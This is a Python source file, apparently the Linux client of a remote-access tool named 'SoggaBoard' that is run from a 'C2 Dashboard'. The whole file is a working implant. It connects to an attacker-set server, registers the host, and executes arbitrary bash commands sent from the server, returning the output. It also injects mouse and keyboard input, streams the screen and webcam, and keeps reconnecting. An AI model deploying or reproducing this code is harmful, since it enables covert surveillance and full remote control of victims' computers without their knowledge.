import os
import subprocess
import threading
import base64
import time
import socket
import platform
import socketio
import cv2
import numpy as np
import pyautogui

# --- SOGGABOARD CONFIG ---
# Replace with your actual server details (e.g., "http://192.168.1.10:8888")
SERVER_URL = "http://your_ip:your_server_port" 
sio = socketio.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=5)

# State Management
FLAGS = {"screen": False, "cam": False}

@sio.event
def connect():
    """Register with the Server immediately upon handshake."""
    try:
        # Get local IP for identification
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"

    sio.emit('register_client', {
        'name': f"{platform.node()} [Linux]",
        'ip': local_ip
    })
    print("[!] LINK ESTABLISHED: SoggaBoard Linux Handshake Complete.")

@sio.on('dispatch')
def on_dispatch(data):
    """Handles incoming commands from the C2 Dashboard."""
    global FLAGS
    action = data.get('action')

    # 1. SHELL EXECUTION
    if action == 'shell':
        try:
            # Using bash for piping/redirection support
            proc = subprocess.Popen(data['data'], shell=True, executable='/bin/bash', 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate(timeout=10)
            output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            sio.emit('shell_response', {'output': output if output.strip() else "Done (No Output)."})
        except Exception as e:
            sio.emit('shell_response', {'output': f"LINUX_ERR: {str(e)}"})

    # 2. REMOTE MOUSE & KEYBOARD
    elif action == 'click':
        try:
            w, h = pyautogui.size()
            pyautogui.click(int(data['x'] * w), int(data['y'] * h))
        except: pass

    elif action == 'keypress':
        try:
            pyautogui.press(data['key'].lower())
        except: pass

    # 3. STREAMING ENGINE
    elif action == 'start_share':
        FLAGS["cam"] = False 
        time.sleep(0.2)
        if not FLAGS["screen"]:
            FLAGS["screen"] = True
            threading.Thread(target=screen_streamer, daemon=True).start()
    
    elif action == 'stop_share':
        FLAGS["screen"] = False
    
    elif action == 'start_webcam':
        FLAGS["screen"] = False
        time.sleep(0.2)
        if not FLAGS["cam"]:
            FLAGS["cam"] = True
            threading.Thread(target=cam_streamer, daemon=True).start()
            
    elif action == 'stop_webcam':
        FLAGS["cam"] = False

# --- STREAMING ENGINES ---

def screen_streamer():
    """Optimized Screen Capture for Linux."""
    print("[*] Screen Stream Started.")
    while FLAGS["screen"]:
        try:
            # Capture using pyautogui and convert to CV2 format
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            
            # Add cursor overlay (Linux screenshots often hide cursor)
            mx, my = pyautogui.position()
            cv2.circle(frame, (mx, my), 5, (0, 0, 255), -1)
            
            # Compress and encode
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
            b64_frame = base64.b64encode(buffer).decode()
            
            sio.emit('frame_data', {'frame': b64_frame, 'type': 'screen'})
            time.sleep(0.05) # ~20 FPS
        except:
            break
    print("[!] Screen Stream Stopped.")

def cam_streamer():
    """Accesses Linux V4L2 Video Hardware."""
    print("[*] Camera Stream Started.")
    cap = cv2.VideoCapture(0)
    while FLAGS["cam"]:
        ret, frame = cap.read()
        if not ret: break
        
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 45])
        b64_frame = base64.b64encode(buffer).decode()
        
        sio.emit('frame_data', {'frame': b64_frame, 'type': 'webcam'})
        time.sleep(0.06)
    cap.release()
    print("[!] Camera Stream Stopped.")

if __name__ == "__main__":
    # Auto-reconnect loop
    while True:
        try:
            if not sio.connected:
                print(f"[*] Attempting connection to {SERVER_URL}...")
                sio.connect(SERVER_URL)
            sio.wait()
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5s...")
            time.sleep(5)
